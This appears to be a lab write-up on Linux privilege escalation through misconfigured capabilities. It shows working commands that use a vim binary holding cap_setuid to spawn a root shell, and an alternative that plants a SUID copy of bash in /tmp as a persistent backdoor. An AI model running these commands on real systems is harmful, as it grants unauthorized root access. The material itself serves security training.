# 🔐 Privilege Escalation: Capabilities

Linux capabilities provide a more granular way of managing privileges compared to the traditional root/non-root permission model.

For example, a SOC analyst may need to use a tool that requires socket connections. Instead of granting full root privileges, the administrator can assign specific capabilities to the binary, allowing it to perform privileged actions securely.

Misconfigured capabilities can sometimes be abused for privilege escalation.

---

## 🔍 Finding Capabilities

To search for binaries with special capabilities assigned, use:

```bash
getcap -r / 2>/dev/null
```

![img](screenshots/capabilities/getcap_command.png)

---
## 📌 Discovered Binaries

During enumeration, we found two interesting binaries:

- `vim`
- `view`

Both binaries have the cap_setuid+ep capability assigned, which allows them to manipulate user IDs and perform setuid operations.
---

## 🚀 Exploiting `vim`

We used the following command to spawn a root shell:

```bash
/home/karen/vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```

![img](screenshots/capabilities/command.png)

After execution, a root shell was obtained successfully.

![img](screenshots/capabilities/get_root_capa.png)

---

## 🔥 Alternative Method

Another technique is to create a SUID-enabled bash binary.

Run:

```bash
/home/karen/vim -c ':py3 import os; os.setuid(0); os.system("cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash")'
```

![img](screenshots/capabilities/other_command.png)

Then execute:

```bash
/tmp/rootbash -p
```

![img](screenshots/capabilities/get_root2.png)
